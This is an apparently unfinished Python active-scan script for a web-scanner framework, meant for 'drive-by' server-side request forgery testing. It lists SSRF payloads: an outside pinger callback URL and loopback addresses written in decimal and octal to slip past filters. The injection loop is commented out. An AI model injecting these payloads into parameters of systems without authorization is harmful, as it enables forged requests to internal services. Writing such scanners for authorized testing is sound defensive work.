"""
The scanNode function will typically be called once for every page 
The scan function will typically be called for every parameter in every URL and Form for every page 

This script is for drive-by server side request forgery testing 
"""

import re
# pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
pattern = re.compile("(?:[0-9]{1,3}\.){3}[0-9]{1,3}|[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)")
# pattern = re.compile("[A-Za-z]")

myAttacks = [
	"https://cloudcmd.mybluemix.net/pinger.php?Geoff=SSRF","http://cloudcmd.mybluemix.net/pinger.php?Geoff=SSRF","127.0.0.1","127.1","2130706433","0177.0000.0000.0001","017700000001"
]   # Pinger , Decimal and octal versions of 127.1

def scanNode(sas, msg):
  # Debugging can be done using print like this
  # print('scan called for url=' + msg.getRequestHeader().getURI().toString());

  # Copy requests before reusing them
  msg = msg.cloneRequest();

  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
  sas.sendAndReceive(msg, False, False);

  # Test the responses and raise alerts as below


def scan(sas, msg, param, value):
  # Debugging can be done using print like this
  # print('scan called for url=' + msg.getRequestHeader().getURI().toString() + ' param=' + param + ' value=' + value);
  if pattern.match(value):
    print("------",value)
    print('scan called for url=' + msg.getRequestHeader().getURI().toString() + ' param=' + param + ' value=' + value);
    # # Copy requests before reusing them
    # new_msg = msg.cloneRequest();
    # for i in myAttacks:
    #     attack = i
    #     # setParam (message, parameterName, newValue)
    #     sas.setParam(new_msg, param, attack);

    #     # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    #     sas.sendAndReceive(new_msg, False, False);
    #     # print("----->>> Sending attack......")
    #     StatusCode = new_msg.getResponseHeader().getStatusCode()
    #     # Test the response here, and make other requests as required
    #     if (StatusCode == 200):
    #         # Change to a test which detects the vulnerability
    #         # raiseAlert(risk, int confidence, String name, String description, String uri, 
    #         #		String param, String attack, String otherInfo, String solution, String evidence, 
    #         #		int cweId, int wascId, HttpMessage msg)
    #         # risk: 0: info, 1: low, 2: medium, 3: high
    #         # confidence: 0: false positive, 1: low, 2: medium, 3: high
    #         sas.raiseAlert(3, 3, '----WALK AROUND--- SSRF', 'Full description',new_msg.getRequestHeader().getURI().toString(),param, attack, 'Any other info', 'The solution ', '', 0, 0, msg);
